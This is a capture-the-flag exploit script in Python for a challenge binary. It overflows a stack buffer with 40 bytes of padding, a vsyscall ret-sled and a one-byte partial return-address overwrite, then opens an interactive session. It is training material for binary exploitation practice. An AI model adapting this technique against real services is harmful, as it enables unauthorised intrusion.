#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *

context.log_level = 'info'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*main+109
        c
        '''.format(**locals()), *a, **kw, env={"FLAG": r"TRX{example_flag}"})
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw, env={"FLAG": r"TRX{example_flag}"})

p = start()

# ==================== EXPLOIT ====================

'''
0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]

0xffffffffff600000               mov    rax, 0x60     RAX => 0x60
0xffffffffff600007               syscall
0xffffffffff600009               ret
'''

def exploit():


    offset = 40
    vsyscall = 0xffffffffff600000

    payload = b'A' * offset
    payload += p64(vsyscall) * 2
    payload += p8(0xa9)

    s(payload)


    interactive()

if __name__ == '__main__':
  exploit()
